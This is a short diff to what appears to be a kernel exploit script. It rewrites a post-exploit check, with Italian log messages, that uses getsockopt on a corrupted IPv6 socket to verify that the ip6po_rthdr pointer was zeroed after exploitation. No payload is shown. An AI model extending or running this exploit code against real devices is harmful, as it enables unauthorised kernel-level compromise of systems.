@@ -1682,18 +1682,19 @@ function verify_post_exploit(kmem, kbase, restore_info) {
     }
 
     try {
-        const [, , , , dirty_sd] = restore_info;
-        const IPPROTO_IPV6 = 41;
-        const IPV6_RTHDR = 51;
-        const rthdr = new Buffer(8);
-        const size = new Word(rthdr.size);
-        sysi("getsockopt", dirty_sd, IPPROTO_IPV6, IPV6_RTHDR, rthdr.addr, size.addr);
-        const val = rthdr.read64(0);
-        if (val.eq(0)) {
-            log("✅ ip6po_rthdr è stato correttamente azzerato.");
-        } else {
-            log(`❌ ip6po_rthdr NON è nullo: ${val}`);
-        }
+       const [, , , , dirty_sd] = restore_info;
+    const IPPROTO_IPV6 = 41;
+    const IPV6_RTHDR = 51;
+    const rthdr = new Buffer(8);
+    const size = new Word(rthdr.size);
+    sysi("getsockopt", dirty_sd, IPPROTO_IPV6, IPV6_RTHDR, rthdr.addr, size.addr);
+    const val = rthdr.read64(0);
+
+    if (val && typeof val.lo === 'number' && val.lo === 0 && val.hi === 0) {
+        log("✅ ip6po_rthdr è stato correttamente azzerato.");
+    } else {
+        log(`❌ ip6po_rthdr NON è nullo: ${val}`);
+    }
     } catch (e) {
         log(`⚠️ Errore nel verificare ip6po_rthdr: ${e}`);
     }
